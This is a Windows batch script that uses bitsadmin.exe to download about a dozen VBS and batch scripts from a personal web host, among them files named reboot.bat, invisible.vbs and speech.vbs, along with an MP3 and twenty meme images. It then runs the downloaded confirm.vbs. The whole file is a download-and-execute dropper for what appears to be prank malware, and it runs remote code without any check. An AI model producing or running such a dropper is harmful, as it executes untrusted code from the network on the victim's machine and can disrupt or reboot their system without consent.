mkdir files
mkdir files\memes

#VBS-Scripts
bitsadmin.exe /transfer "JobName1" /priority high https://haverkae.home.xs4all.nl/scripts/dvd.vbs "%cd%\files\dvd.vbs"
bitsadmin.exe /transfer "JobName2" /priority high https://haverkae.home.xs4all.nl/scripts/random_meme_open.bat "%cd%\files\random_meme_open.bat"
bitsadmin.exe /transfer "JobName24" /priority high https://haverkae.home.xs4all.nl/scripts/random_meme_open_pviewer.vbs "%cd%\files\random_meme_open_pviewer.vbs"
bitsadmin.exe /transfer "JobName25" /priority high https://haverkae.home.xs4all.nl/scripts/start_all.bat "%cd%\files\start_all.bat"
bitsadmin.exe /transfer "JobName26" /priority high https://haverkae.home.xs4all.nl/scripts/light.vbs "%cd%\files\light.vbs"
bitsadmin.exe /transfer "JobName27" /priority high https://haverkae.home.xs4all.nl/scripts/readyformemes.vbs "%cd%\files\readyformemes.vbs"
bitsadmin.exe /transfer "JobName28" /priority high https://haverkae.home.xs4all.nl/scripts/speech.vbs "%cd%\files\speech.vbs"
bitsadmin.exe /transfer "JobName30" /priority high https://haverkae.home.xs4all.nl/scripts/reboot.bat "%cd%\files\reboot.bat"
bitsadmin.exe /transfer "JobName31" /priority high https://haverkae.home.xs4all.nl/scripts/confirm.vbs "%cd%\files\confirm.vbs"
bitsadmin.exe /transfer "JobName32" /priority high https://haverkae.home.xs4all.nl/scripts/lookatlights.vbs "%cd%\files\lookatlights.vbs"
bitsadmin.exe /transfer "JobName33" /priority high https://haverkae.home.xs4all.nl/scripts/invisible.vbs "%cd%\files\invisible.vbs"
bitsadmin.exe /transfer "JobName34" /priority high https://haverkae.home.xs4all.nl/scripts/matrix.bat "%cd%\files\matrix.bat"

bitsadmin.exe /transfer "JobName29" /priority high https://haverkae.home.xs4all.nl/scripts/mlg-airhorn.mp3 "%cd%\files\mlg-airhorn.mp3"

#Memes
bitsadmin.exe /transfer "JobName4" /priority high https://haverkae.home.xs4all.nl/scripts/memes/1.jpg "%cd%\files\memes\1.jpg"
bitsadmin.exe /transfer "JobName5" /priority high https://haverkae.home.xs4all.nl/scripts/memes/2.jpg "%cd%\files\memes\2.jpg"
bitsadmin.exe /transfer "JobName6" /priority high https://haverkae.home.xs4all.nl/scripts/memes/3.jpg "%cd%\files\memes\3.jpg"
bitsadmin.exe /transfer "JobName7" /priority high https://haverkae.home.xs4all.nl/scripts/memes/4.jpg "%cd%\files\memes\4.jpg"
bitsadmin.exe /transfer "JobName8" /priority high https://haverkae.home.xs4all.nl/scripts/memes/5.jpg "%cd%\files\memes\5.jpg"
bitsadmin.exe /transfer "JobName9" /priority high https://haverkae.home.xs4all.nl/scripts/memes/6.jpg "%cd%\files\memes\6.jpg"
bitsadmin.exe /transfer "JobName10" /priority high https://haverkae.home.xs4all.nl/scripts/memes/7.jpg "%cd%\files\memes\7.jpg"
bitsadmin.exe /transfer "JobName11" /priority high https://haverkae.home.xs4all.nl/scripts/memes/8.jpg "%cd%\files\memes\8.jpg"
bitsadmin.exe /transfer "JobName12" /priority high https://haverkae.home.xs4all.nl/scripts/memes/9.jpg "%cd%\files\memes\9.jpg"
bitsadmin.exe /transfer "JobName13" /priority high https://haverkae.home.xs4all.nl/scripts/memes/10.jpg "%cd%\files\memes\10.jpg"
bitsadmin.exe /transfer "JobName14" /priority high https://haverkae.home.xs4all.nl/scripts/memes/11.jpg "%cd%\files\memes\11.jpg"
bitsadmin.exe /transfer "JobName15" /priority high https://haverkae.home.xs4all.nl/scripts/memes/12.jpg "%cd%\files\memes\12.jpg"
bitsadmin.exe /transfer "JobName16" /priority high https://haverkae.home.xs4all.nl/scripts/memes/13.jpg "%cd%\files\memes\13.jpg"
bitsadmin.exe /transfer "JobName17" /priority high https://haverkae.home.xs4all.nl/scripts/memes/14.jpg "%cd%\files\memes\14.jpg"
bitsadmin.exe /transfer "JobName18" /priority high https://haverkae.home.xs4all.nl/scripts/memes/15.jpg "%cd%\files\memes\15.jpg"
bitsadmin.exe /transfer "JobName19" /priority high https://haverkae.home.xs4all.nl/scripts/memes/16.jpg "%cd%\files\memes\16.jpg"
bitsadmin.exe /transfer "JobName20" /priority high https://haverkae.home.xs4all.nl/scripts/memes/17.jpg "%cd%\files\memes\17.jpg"
bitsadmin.exe /transfer "JobName21" /priority high https://haverkae.home.xs4all.nl/scripts/memes/18.jpg "%cd%\files\memes\18.jpg"
bitsadmin.exe /transfer "JobName22" /priority high https://haverkae.home.xs4all.nl/scripts/memes/19.jpg "%cd%\files\memes\19.jpg"
bitsadmin.exe /transfer "JobName23" /priority high https://haverkae.home.xs4all.nl/scripts/memes/20.jpg "%cd%\files\memes\20.jpg"
cd files
confirm.vbs
exit